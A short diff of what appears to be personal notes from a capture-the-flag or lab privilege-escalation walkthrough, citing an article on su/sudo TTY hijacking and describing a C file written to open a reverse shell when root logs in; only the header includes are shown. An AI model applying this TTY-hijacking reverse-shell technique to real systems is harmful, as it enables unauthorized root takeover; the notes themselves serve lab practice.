@@ -250,8 +250,7 @@ postgres@download:~$
 
 https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking
 
-- created a TTY_exploit.c:
-  GNU nano 5.4                                             TTY_exploit.c                                               I      
+- created a TTY_exploit.c to rev shell when root logs in:  
 #include <fcntl.h>
 #include <stdio.h>
 #include <string.h>
